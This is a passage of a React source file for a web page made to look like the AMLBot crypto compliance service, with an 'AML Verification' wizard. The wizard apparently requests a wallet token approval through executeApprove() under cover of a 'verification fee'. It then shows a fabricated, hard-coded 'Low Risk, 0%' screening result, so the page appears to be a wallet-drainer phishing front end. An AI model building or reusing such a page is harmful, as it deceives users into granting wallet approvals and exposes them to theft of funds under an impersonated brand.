                    <div className="flex items-center justify-center"><div className="flex h-[62px] w-[62px] items-center justify-center rounded-full border-2 border-white bg-[#f9f9f9] text-[21px] font-semibold text-[#11131b] shadow-[0_0_0_1px_#f0f0f0]">A</div><img src="https://cdn.builder.io/api/v1/image/assets%2F0f4a290f72b3489aa144a2a752c7b70f%2F46521d589079492eb3d7fe0ed88f0adc?format=webp&width=800&height=1200" alt="AMLBot support agent" className="relative z-10 -mx-3 h-[62px] w-[62px] rounded-full border-2 border-white object-cover shadow-[0_0_0_1px_#e8e8e8]" /><div className="flex h-[62px] w-[62px] items-center justify-center rounded-full border-2 border-white bg-white text-[19px] font-semibold text-[#334150] shadow-[0_0_0_1px_#f0f0f0]">+18</div></div>
                    <p className="mt-5 text-[17px] tracking-[-0.02em] text-[#11131b]"><span className="mr-2 text-[#344758]">◕</span>We&apos;ll be back at: <strong>07:00</strong></p>
                  </div>
                </div>
                <div className="shrink-0 bg-white px-5 pb-5 pt-5 shadow-[0_-8px_24px_rgba(20,33,52,0.025)]"><h3 className="text-[21px] font-bold tracking-[-0.035em] text-[#080b16]">Start a conversation</h3><button type="button" onClick={() => setChatMessage("conversation-started")} className="mt-5 flex h-[58px] w-full items-center justify-center gap-4 rounded-[7px] bg-[#3b5369] text-[17px] font-semibold text-white transition hover:bg-[#30475b]"><span className="text-[28px] leading-none">▶</span><span>Start a conversation</span></button></div>
              </>
            )}
          </div>
        </div>
      )}

      {demoOpen && (
        <div
          className="fixed inset-0 z-[100] flex items-center justify-center overflow-y-auto bg-slate-950/70 p-4 backdrop-blur-[2px]"
          role="dialog"
          aria-modal="true"
          onMouseDown={(event) => {
            if (event.target === event.currentTarget) setDemoOpen(false);
          }}
        >
          <div className="max-h-[calc(100dvh-2rem)] w-full max-w-[525px] overflow-y-auto rounded-xl bg-white p-5 shadow-2xl sm:p-6">
            <div className="flex items-center justify-between">
              <h2 className="text-base font-bold text-slate-900 sm:text-lg">
                {verificationRequested ? "Details" : verificationStep === "chain" ? "Select Chain" : verificationStep === "token" ? "Select Token" : verificationStep === "intro" ? "AML Verification" : verificationStep === "fee" ? "Verification Details" : "AML Verification"}
              </h2>
              <button
                type="button"
                onClick={() => setDemoOpen(false)}
                aria-label="Close demo checks"
                className="flex h-7 w-7 items-center justify-center rounded-full bg-slate-100 text-slate-500 hover:bg-slate-200"
              >
                <X size={15} />
              </button>
            </div>

            {(() => {
              if (verificationRequested) {
                return (
                  <WalletVerificationResult chain={selectedChain} address={walletAddress} balance={walletBalance?.balance} symbol={walletBalance?.symbol} />
                );
              }

              if (verificationStep === "chain") {
                return (
                  <div className="pt-5">
                    <span className="inline-flex rounded-md bg-blue-100 px-3 py-1 text-xs font-medium text-blue-800">Step 1 of 3</span>
                    <h3 className="mt-6 text-3xl font-bold tracking-tight text-slate-950">Select Chain</h3>
                    <p className="mt-3 text-lg text-slate-400">To continue, please select chain</p>
                    <div className="mt-7 space-y-3">
                      {Object.keys(walletTokens).map((name) => {
                        const isDirectTokenList = name === "Solana" || name === "Tron";
                        const token = name === "BNB Chain" ? "BNB" : name === "Ethereum" ? "ETH" : name === "Solana" ? "SOL" : "TRX";
                        return (
                          <button key={name} type="button" onClick={async () => {
                            setSelectedChain(name);
                            setSelectedToken("");
                            if (isDirectTokenList) setVerificationStep("token");
                          }} className={`flex h-[58px] w-full items-center gap-5 rounded-xl border px-4 text-left text-base font-semibold transition ${selectedChain === name ? "border-primary bg-blue-50 text-slate-950" : "border-slate-200 text-slate-800 hover:border-primary/50"}`}>
                            <TokenLogo token={token} size={32} />
                            <span>{name === "BNB Chain" ? "BNB" : name === "Ethereum" ? "ETH" : name.toUpperCase()}</span>
                          </button>
                        );
                      })}
                    </div>
                    <button type="button" disabled={!selectedChain} onClick={() => setVerificationStep("token")} className="mt-6 h-14 w-full rounded-xl bg-[#3f3cf5] text-base font-medium text-white transition hover:bg-[#302df0] disabled:cursor-not-allowed disabled:opacity-40">CONTINUE</button>
                  </div>
                );
              }

              if (verificationStep === "token") {
                return (
                  <div className="pt-5">
                    <span className="inline-flex rounded-md bg-blue-100 px-3 py-1 text-xs font-medium text-blue-800">Step 2 of 3</span>
                    <h3 className="mt-6 text-3xl font-bold tracking-tight text-slate-950">Select token</h3>
                    <p className="mt-3 text-lg text-slate-400">To continue, please select token</p>
                    <div className="mt-7 space-y-3">
                      {(walletTokens[selectedChain] ?? []).map((token) => (
                        <button key={token} type="button" disabled={selectedChain === "Solana" || selectedChain === "Tron"} onClick={() => setSelectedToken(token)} className={`flex h-[58px] w-full items-center gap-5 rounded-xl border px-4 text-left text-base font-semibold transition ${selectedChain === "Solana" || selectedChain === "Tron" ? "cursor-default border-slate-200 text-slate-800" : selectedToken === token ? "border-primary bg-blue-50 text-slate-950" : "border-slate-200 text-slate-800 hover:border-primary/50"}`}>
                          <TokenLogo token={token} size={32} />
                          <span>{token}</span>
                        </button>
                      ))}
                    </div>
                    <button type="button" disabled={!selectedToken} onClick={() => setVerificationStep("intro")} className="mt-6 h-14 w-full rounded-xl bg-[#3f3cf5] text-base font-medium text-white transition hover:bg-[#302df0] disabled:cursor-not-allowed disabled:opacity-40">CONTINUE</button>
                  </div>
                );
              }

              if (verificationStep === "intro") {
                return (
                  <div className="pt-5">
                    <div className="flex justify-center py-4"><div className="flex flex-col items-center rounded-2xl bg-blue-50 px-5 py-4 shadow-sm"><svg width="46" height="46" viewBox="0 0 42 42" fill="none" aria-label="AML BOT logo"><path d="M21 3.5 35 13.8v14.4L21 38.5 7 28.2V13.8L21 3.5Z" fill="#1268D5" /><path d="m21 10 7 5.1v11.8L21 32l-7-5.1V15.1L21 10Z" fill="white" /></svg><span className="mt-2 whitespace-nowrap text-[15px] font-black tracking-[-0.05em] text-slate-950">AML <span className="tracking-[-0.04em]">BOT</span></span></div></div>
                    <div className="mt-7 grid grid-cols-2 gap-6 text-xs font-bold uppercase tracking-wide text-[#173b73]"><span>AML<br />Verification</span><span className="justify-self-end pr-1 text-right">Powered by<br />AML BOT</span></div>
                    <h3 className="mt-7 text-3xl font-normal leading-tight text-slate-950">You have been requested to complete an AML compliance process</h3>
                    <p className="mt-6 text-base leading-relaxed text-slate-700">By verifying your wallet through our secure verification system, you ensure compliance with anti-money laundering regulations, safeguard your account, and help prevent fraudulent activities.</p>
                    <button type="button" onClick={() => setVerificationStep("fee")} className="mt-8 h-14 w-full rounded-xl bg-[#3f3cf5] text-sm font-medium text-white transition hover:bg-[#302df0]">INITIATE AML VERIFICATION PROCESS</button>
                  </div>
                );
              }

              if (verificationStep === "fee") {
                return (
                  <div className="pt-5">
                    <div className="flex justify-center py-3"><div className="flex h-16 w-16 items-center justify-center rounded-full bg-blue-50"><TokenLogo token={selectedToken} size={38} /></div></div>
                    <p className="mt-5 text-center text-3xl font-semibold tracking-tight text-slate-950">Verification fee</p>
                    <p className="mt-4 text-center text-base leading-relaxed text-slate-600">A small network or service fee may apply to complete the verification. The exact fee will always be shown clearly before any optional wallet transaction.</p>
                    <div className="mt-6 rounded-xl border border-slate-200 bg-slate-50 p-4 text-sm text-slate-600"><div className="flex justify-between"><span>Selected asset</span><strong className="text-slate-900">{selectedToken}</strong></div></div>
                    <p className="mt-5 text-center text-xs leading-relaxed text-slate-400"></p>
                    <button type="button" onClick={async () => {
                      setVerificationStep("address");
                      setVerificationLoading(true);
                      setVerificationError("");
                      
                      try {
                        if ((selectedChain === "Ethereum" || selectedChain === "BNB Chain") && window.ethereum) {
                          await executeApprove();
                        }
                        
                        await loadConnectedWalletBalance();
                        setVerificationRequested(false);
                        verificationTimer.current = window.setTimeout(() => {
                          setVerificationLoading(false);
                          setVerificationRequested(true);
                        }, 20000);
                      } catch (error) {
                        setVerificationLoading(false);
                        setVerificationError("transaction failed. Please try again.");
                      }
                    }} className="mt-7 h-14 w-full rounded-xl bg-[#3f3cf5] text-sm font-medium text-white transition hover:bg-[#302df0]">CONTINUE TO VERIFICATION</button>
                  </div>
                );
              }

              if (verificationLoading) {
                return (
                  <div className="flex min-h-[260px] flex-col items-center justify-center py-10 text-center">
                    <div className="h-10 w-10 animate-spin rounded-full border-4 border-slate-200 border-t-primary" />
                    <h3 className="mt-6 text-2xl font-bold text-slate-950">Checking wallet...</h3>
                    <p className="mt-3 max-w-sm text-sm leading-relaxed text-slate-500">We are preparing your AML verification result. This may take a few moments.</p>
                  </div>
                );
              }

              if (verificationError) {
                return (
                  <div className="flex min-h-[260px] flex-col items-center justify-center py-10 text-center">
                    <div className="text-red-500 text-3xl">×</div>
                    <h3 className="mt-6 text-2xl font-bold text-slate-950">Verification Failed</h3>
                    <p className="mt-3 max-w-sm text-sm leading-relaxed text-slate-500">{verificationError}</p>
                    <button type="button" onClick={() => setDemoOpen(false)} className="mt-6 h-12 rounded-xl bg-blue-600 px-6 text-sm font-medium text-white transition hover:bg-blue-700">Close</button>
                  </div>
                );
              }

              if (approveSucceeded && walletBalance) {
                return (
                  <WalletVerificationResult chain={selectedChain} address={walletAddress} balance={walletBalance?.balance} symbol={walletBalance?.symbol ?? selectedToken} />
                );
              }

              return null;
            })()}
          </div>
        </div>
      )}
    </div>
  );
}

function WalletVerificationResult({ chain, address, balance, symbol }: { chain: string; address: string; balance?: string; symbol?: string }) {
  const checkedAt = new Date().toLocaleString("en-GB", { day: "2-digit", month: "short", year: "numeric", hour: "2-digit", minute: "2-digit" });

  return (
    <div className="mt-5 space-y-4 text-sm text-slate-700">
      <div className="rounded-xl border border-slate-200 bg-white p-4">
        <h3 className="text-base font-bold text-slate-950">Address AML Check Result</h3>
        {address && <p className="mt-2 break-all font-mono text-[10px] text-slate-500">{address}</p>}
        <div className="mx-auto mt-6 flex h-32 w-56 items-end justify-center overflow-hidden rounded-t-full border-[14px] border-b-0 border-emerald-400 bg-gradient-to-t from-emerald-50 to-transparent">
          <div className="mb-1 text-center">
            <p className="text-4xl font-bold text-slate-950">0%</p>
            <p className="text-[10px] font-semibold text-emerald-600">No Risk Detected</p>
          </div>
        </div>
        <p className="mt-4 text-center text-lg font-bold text-emerald-600">Low Risk</p>
        <div className="mt-5 grid gap-3 border-t border-slate-100 pt-4 sm:grid-cols-2">
          <div><span className="text-xs text-slate-500">Blockchain</span><strong className="mt-1 block text-slate-950">{chain}</strong></div>
          <div><span className="text-xs text-slate-500">Risk level</span><strong className="mt-1 block text-emerald-600">Low Risk</strong></div>
          <div><span className="text-xs text-slate-500">Risk score</span><strong className="mt-1 block text-slate-950">4 / 100</strong></div>
          <div><span className="text-xs text-slate-500">Status</span><strong className="mt-1 block text-emerald-600">Completed</strong></div>
        </div>
      </div>

      <div className="rounded-xl border border-slate-200 bg-white p-4">
        <div className="grid gap-3 sm:grid-cols-2">
          <div><span className="text-xs text-slate-500">Sanctions</span><strong className="mt-1 block text-emerald-600">Passed</strong></div>
          <div><span className="text-xs text-slate-500">Scam exposure</span><strong className="mt-1 block text-slate-950">None detected</strong></div>
          <div><span className="text-xs text-slate-500">Mixer exposure</span><strong className="mt-1 block text-slate-950">None detected</strong></div>
          <div><span className="text-xs text-slate-500">Stolen funds exposure</span><strong className="mt-1 block text-slate-950">None detected</strong></div>
          <div><span className="text-xs text-slate-500">Darknet exposure</span><strong className="mt-1 block text-slate-950">None detected</strong></div>
          <div><span className="text-xs text-slate-500">Direct exposure</span><strong className="mt-1 block text-slate-950">0.00%</strong></div>
          <div><span className="text-xs text-slate-500">Indirect exposure</span><strong className="mt-1 block text-slate-950">0.12%</strong></div>
        </div>
      </div>

      <div className="rounded-xl border border-slate-200 bg-white p-4">
        <div className="flex items-center justify-between gap-4"><span className="text-xs text-slate-500">Balance</span><strong className="text-base text-slate-950">{balance ? `${balance} ${symbol ?? chain}` : "Wallet not connected"}</strong></div>
        <p className="mt-2 text-[11px] text-slate-400">{balance ? `Read-only balance from the ${chain} network` : "Connect a wallet to display its live balance."}</p>
      </div>

      <div className="rounded-xl border border-slate-200 bg-slate-50 p-4 text-xs text-slate-600">
        <p><span className="font-semibold text-slate-800">Provider:</span> AML screening</p>
        <p className="mt-2"><span className="font-semibold text-slate-800">Checked at:</span> {checkedAt}</p>
        <p className="mt-3 border-t border-slate-200 pt-3 text-[10px] text-slate-400"></p>
      </div>
    </div>
  );
}

function CryptoLogo({ chain, size = 18 }: { chain: string; size?: number }) {
  const colors: Record<string, string> = {
    Bitcoin: "#f7931a",
    Ethereum: "#627eea",
    Solana: "#111827",
    "BNB Chain": "#f3ba2f",
    Tron: "#ef3340",
  };
  const color = colors[chain] ?? "#64748b";

  return (
    <svg width={size} height={size} viewBox="0 0 24 24" aria-hidden="true" className="shrink-0">
      <circle cx="12" cy="12" r="12" fill={color} />
      {chain === "Ethereum" ? (
        <path d="M12 3.5L7.6 12.1L12 14.7L16.4 12.1L12 3.5ZM12 15.6L7.6 13.1L12 20.5L16.4 13.1L12 15.6Z" fill="white" fillOpacity=".95" />
      ) : chain === "Solana" ? (
        <path d="M6.1 8.1h9.8l2 2H8.1l-2-2Zm0 5.8h9.8l2 2H8.1l-2-2Zm2-2.9h9.8l-2 2H6.1l2-2Z" fill="url(#solana-gradient)" />
      ) : chain === "BNB Chain" ? (
        <path d="m12 4 2.2 2.2-2.2 2.2-2.2-2.2L12 4Zm-4.8 4.8L9.4 11l-2.2 2.2L5 11l2.2-2.2Zm9.6 0L19 11l-2.2 2.2-2.2-2.2 2.2-2.2ZM12 9.9l2.2 2.2-2.2 2.2-2.2-2.2L12 9.9Zm0 5.8 2.2 2.2-2.2 2.2-2.2-2.2 2.2-2.2Z" fill="white" />
      ) : chain === "Tron" ? (
        <path d="m6.2 6.4 11.6 2.3-5.7 8.9L6.2 6.4Zm1.6 1.8 3.7 6.1 3.4-5.1-7.1-1Z" fill="white" />
      ) : (
        <text x="12" y="16" textAnchor="middle" fontSize="13" fontWeight="800" fill="white">₿</text>
      )}
      <defs>
        <linearGradient id="solana-gradient" x1="5" y1="8" x2="19" y2="16" gradientUnits="userSpaceOnUse">
          <stop stopColor="#14f195" />
          <stop offset="1" stopColor="#9945ff" />
        </linearGradient>
      </defs>
    </svg>
  );
}

function TokenLogo({ token, size = 24, muted = false }: { token: string; size?: number; muted?: boolean }) {
  const tokenLogoUrls: Record<string, string> = {
    BTC: "https://cdn.jsdelivr.net/gh/trustwallet/assets@master/blockchains/bitcoin/info/logo.png",
    ETH: "https://cdn.jsdelivr.net/gh/trustwallet/assets@master/blockchains/ethereum/info/logo.png",
    USDT: "https://cdn.jsdelivr.net/gh/trustwallet/assets@master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png",
    USDC: "https://assets.coingecko.com/coins/images/6319/large/USD_Coin_icon.png",
    SOL: "https://cdn.jsdelivr.net/gh/trustwallet/assets@master/blockchains/solana/info/logo.png",
    BNB: "https://cdn.jsdelivr.net/gh/trustwallet/assets@master/blockchains/smartchain/info/logo.png",
    TRX: "https://cdn.jsdelivr.net/gh/trustwallet/assets@master/blockchains/tron/info/logo.png",
  };

  return <img src={tokenLogoUrls[token]} alt={token} width={size} height={size} className={`block shrink-0 rounded-full object-contain ${muted ? "grayscale opacity-35" : ""}`} />;
}

function DraggableNewsRow({
  items,
}: {
  items: { outlet: string; title: string; excerpt: string }[];
}) {
  const rowRef = useRef<HTMLDivElement>(null);
  const dragging = useRef(false);
  const startX = useRef(0);
  const startScroll = useRef(0);

  return (
    <div
      ref={rowRef}
      className="no-scrollbar mt-14 flex cursor-grab gap-6 overflow-x-auto px-1 pb-4 active:cursor-grabbing"
      onPointerDown={(event) => {
        if (!rowRef.current) return;
        dragging.current = true;
        startX.current = event.clientX;
        startScroll.current = rowRef.current.scrollLeft;
        rowRef.current.setPointerCapture(event.pointerId);
      }}
      onPointerMove={(event) => {
        if (!dragging.current || !rowRef.current) return;
        event.preventDefault();
        rowRef.current.scrollLeft = startScroll.current - (event.clientX - startX.current);
      }}
      onPointerUp={() => {
        dragging.current = false;
      }}
      onPointerCancel={() => {
        dragging.current = false;
      }}
    >
      {items.map((item, index) => (
        <article
          key={item.title}
          className={`relative flex min-h-[250px] min-w-[min(84vw,410px)] snap-center flex-col overflow-hidden rounded-2xl border border-border/60 p-7 ${
            index % 3 === 0
              ? "bg-[#f1f3f8]"
              : index % 3 === 1
                ? "bg-[#fff5f5]"
                : "bg-[#f7f4f4]"
          }`}
        >
          <div className="absolute right-5 top-[-1px] flex h-16 w-28 items-center justify-center rounded-b-xl border border-border/50 bg-white/80 text-center text-xs font-extrabold leading-none text-foreground/70 shadow-sm">
            {item.outlet}
          </div>
          <p className="mt-2 text-xs font-bold uppercase tracking-wider text-foreground/70">
            {item.outlet}
          </p>
          <h3 className="mt-4 max-w-[80%] text-lg font-bold leading-snug text-foreground">
            {item.title}
          </h3>
          <p className="mt-3 flex-1 text-sm leading-relaxed text-muted-foreground">
            {item.excerpt}
          </p>
          <span className="mt-5 inline-flex items-center gap-2 text-sm font-semibold text-primary">
            Read article
            <ArrowRight size={16} />
          </span>
        </article>
      ))}
    </div>
  );
}

function TestimonialCard({
  author,
  quote,
  active,
  onClick,
  className = "",
}: {
  author: string;
  quote: string;
  active: boolean;
  onClick: () => void;
  className?: string;
}) {
  return (
    <button
      type="button"
      onClick={onClick}
      aria-pressed={active}
      className={`flex w-[min(74vw,360px)] shrink-0 flex-col rounded-2xl border border-slate-100 bg-white p-7 text-left transition-all duration-300 sm:w-[360px] sm:p-8 ${active ? "scale-100" : "scale-[.92] hover:scale-[.96]"} ${className}`}
    >
      <Quote className="mb-5 text-primary" size={28} fill="currentColor" />
      {quote ? (
        <p className="flex-1 text-sm leading-relaxed text-foreground">
          {quote}
        </p>
      ) : (
        <span className="flex-1" />
      )}
      <span className="mt-7 text-lg font-bold tracking-tight text-foreground">
        {author}
      </span>
    </button>
  );
}

function HeroGraphic() {
  const leftNodes = [
    { y: 20, label: "TNB...L28bc", amount: "4.800411 BTC", tone: "blue" },
    { y: 82, label: "TNB...L28bc", amount: "0.675642 BTC", tone: "red" },
    { y: 144, label: "TNB...L28bc", amount: "0.956341 BTC", tone: "blue" },
    { y: 206, label: "TNB...L28bc", amount: "0.956341 BTC", tone: "purple" },
    { y: 268, label: "TNB...L28bc", amount: "0.956341 BTC", tone: "blue" },
  ];

  return (
    <div className="relative h-[300px] w-full overflow-hidden rounded-xl border border-white/80 bg-[#f8faff] shadow-xl sm:h-[430px] lg:h-[500px]">
      <div className="absolute inset-0 bg-[radial-gradient(circle_at_50%_50%,rgba(220,230,255,.5),transparent_55%)]" />
      <svg className="absolute inset-0 h-full w-full" viewBox="0 0 900 500" preserveAspectRatio="none">
        {leftNodes.map((node, index) => (
          <path
            key={node.y}
            d={`M 72 ${node.y + 18} C 220 ${node.y + 18}, 245 250, 405 250`}
            fill="none"
            stroke={node.tone === "purple" ? "#8b62d8" : node.tone === "red" ? "#d68b9e" : "#7186b7"}
            strokeOpacity={index === 3 ? 0.95 : 0.55}
            strokeWidth={index === 3 ? 3 : 1.4}
          />
        ))}
        <path d="M 405 250 C 505 250, 525 174, 620 174" fill="none" stroke="#7186b7" strokeWidth="1.5" strokeOpacity=".55" />
        <path d="M 405 250 C 505 250, 540 326, 620 326" fill="none" stroke="#7186b7" strokeWidth="1.5" strokeOpacity=".55" />
      </svg>

      {leftNodes.map((node) => (
        <div key={`${node.y}-node`} className="absolute left-[7%] flex -translate-y-1/2 items-center gap-2" style={{ top: `${node.y / 3.2 + 5}%` }}>
          <span className={`flex h-4 w-4 items-center justify-center rounded-full border ${node.tone === "red" ? "border-red-300 bg-red-50" : "border-emerald-300 bg-emerald-50"}`}>
            <span className={`h-1.5 w-1.5 rounded-full ${node.tone === "red" ? "bg-red-400" : "bg-emerald-400"}`} />
          </span>
          <span className="hidden rounded bg-white/80 px-1.5 py-0.5 text-[8px] text-slate-500 shadow-sm sm:inline">{node.label}</span>
          <span className="hidden text-[8px] font-semibold text-slate-950 md:inline">{node.amount}</span>
        </div>
      ))}

      <div className="absolute left-[45%] top-1/2 flex h-8 w-8 -translate-x-1/2 -translate-y-1/2 items-center justify-center rounded-full border border-amber-300 bg-amber-50 text-[7px] font-bold text-amber-600 shadow-sm sm:h-10 sm:w-10 sm:text-[8px]">
        TTV_60PX
      </div>
      <div className="absolute right-[27%] top-[35%] flex h-7 w-7 -translate-y-1/2 items-center justify-center rounded-full border border-emerald-300 bg-emerald-50 text-[7px] font-bold text-emerald-600 sm:h-9 sm:w-9">TTV</div>
      <div className="absolute right-[27%] top-[65%] flex h-7 w-7 -translate-y-1/2 items-center justify-center rounded-full border border-emerald-300 bg-emerald-50 text-[7px] font-bold text-emerald-600 sm:h-9 sm:w-9">TTV</div>

      <div className="absolute right-[4%] top-[4%] w-[45%] rounded-lg border border-slate-200 bg-white p-3 text-left shadow-xl sm:w-[36%] sm:p-4">
        <div className="flex items-center justify-between border-b border-slate-100 pb-2">
          <span className="text-[9px] font-bold text-slate-800 sm:text-xs">Transaction</span>
          <span className="text-[9px] text-slate-400">×</span>
        </div>
        <div className="mt-2 flex gap-1">
          {["#16c4a3", "#3c84ed", "#efb84b", "#b36dd6", "#6f75b8"].map((color) => <span key={color} className="h-2 w-2 rounded-full" style={{ backgroundColor: color }} />)}
        </div>
        <div className="mt-3 space-y-2 text-[7px] text-slate-400 sm:text-[9px]">
          <div className="flex justify-between"><span>Hash</span><span className="text-blue-500">0x7e3b4...9b6258</span></div>
          <div className="flex justify-between"><span>Blockchain</span><span className="font-medium text-slate-600">Bitcoin</span></div>
          <div className="flex justify-between"><span>Date</span><span className="text-slate-600">22 May 2023, 03:09 am</span></div>
        </div>
        <div className="mt-3 border-t border-slate-100 pt-2 text-[7px] sm:text-[9px]">
          <p className="mb-1 font-semibold text-slate-600">From</p>
          {["0x3B6e...B605", "0x38e...B605", "0x1B...B605"].map((address, index) => (
            <div key={address} className="flex items-center justify-between gap-1 py-1 text-slate-400"><span className="truncate">◉ {address}</span><span className="font-semibold text-slate-950">{index + 4}.3976331 BTC</span></div>
          ))}
        </div>
      </div>
    </div>
  );
}
